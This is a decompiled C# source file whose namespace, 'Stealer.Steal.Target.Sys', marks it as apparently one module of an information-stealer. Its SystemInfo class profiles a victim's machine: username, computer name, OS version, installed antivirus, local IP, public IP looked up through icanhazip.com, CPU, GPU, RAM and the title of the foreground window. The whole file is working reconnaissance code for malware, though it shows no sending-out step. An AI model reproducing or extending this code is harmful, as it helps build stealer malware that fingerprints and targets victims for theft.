using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stealer.Steal.Target.Sys;

internal class SystemInfo
{
	public static string Username = Environment.UserName;

	public static string Compname = Environment.MachineName;

	public static string Culture = CultureInfo.CurrentCulture.ToString();

	public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

	public static string ScreenMetrics()
	{
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		int width = bounds.Width;
		int height = bounds.Height;
		return width + "x" + height;
	}

	private static string GetWindowsVersionName()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		string text = "Unknown System";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						text = Convert.ToString(((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"]);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				text = text.Split(new char[1] { '|' })[0];
				int length = text.Split(new char[1] { ' ' })[0].Length;
				text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return text;
	}

	private static string GetBitVersion()
	{
		try
		{
			return Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString()
				.Contains("x86") ? "(32 Bit)" : "(64 Bit)";
		}
		catch
		{
		}
		return "(Unknown)";
	}

	public static string GetSystemVersion()
	{
		return GetWindowsVersionName() + " " + GetBitVersion();
	}

	public static string GetDefaultGateway()
	{
		try
		{
			return (from g in (from n in NetworkInterface.GetAllNetworkInterfaces()
					where n.OperationalStatus == OperationalStatus.Up
					where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
					select n).SelectMany((NetworkInterface n) => n.GetIPProperties()?.GatewayAddresses)
				select g?.Address into a
				where a != null
				select a).FirstOrDefault()?.ToString();
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetAntivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.Current;
						list.Add(current["displayName"].ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "Not installed";
				}
				return string.Join(", ", list.ToArray()) + ".";
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return "N/A";
	}

	public static string GetLocalIp()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
		}
		catch
		{
		}
		return "No network adapters with an IPv4 address in the system!";
	}

	public static string GetPublicIpAsync()
	{
		try
		{
			using WebClient webClient = new WebClient();
			return webClient.DownloadString("http://icanhazip.com").Replace("\n", "");
		}
		catch
		{
		}
		return "Request failed";
	}

	public static string GetCpuName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"].ToString() + " @ " + Environment.ProcessorCount;
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetGpuName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("Caption: " + ((ManagementBaseObject)val)["Caption"], "DriverVersion: ", ((ManagementBaseObject)val)["DriverVersion"]?.ToString()), "VideoArchitecture: ", ((ManagementBaseObject)val)["VideoArchitecture"]?.ToString()), "CurrentBitsPerPixel: ", ((ManagementBaseObject)val)["CurrentBitsPerPixel"]?.ToString(), " Bit"), "AdapterCompatibility: ", ((ManagementBaseObject)val)["AdapterCompatibility"]?.ToString()), "AdapterRAM: ", ((ManagementBaseObject)val)["AdapterRAM"]?.ToString(), " байт");
					return ((ManagementBaseObject)val)["Name"].ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetRamAmount()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						num = (int)(Convert.ToDouble(((ManagementBaseObject)(ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return num + "MB";
		}
		catch
		{
		}
		return "-1";
	}

	public static string CompactVersion()
	{
		if (GetWindowsVersionName().Contains("7"))
		{
			return "Windows 7";
		}
		if (GetWindowsVersionName().Contains("8.1"))
		{
			return "Windows 8.1";
		}
		if (GetWindowsVersionName().Contains("8"))
		{
			return "Windows 8";
		}
		if (GetWindowsVersionName().Contains("10"))
		{
			return "Windows 10";
		}
		if (GetWindowsVersionName().Contains("11"))
		{
			return "Windows 11";
		}
		return "Windows 0";
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (GetWindowText(GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
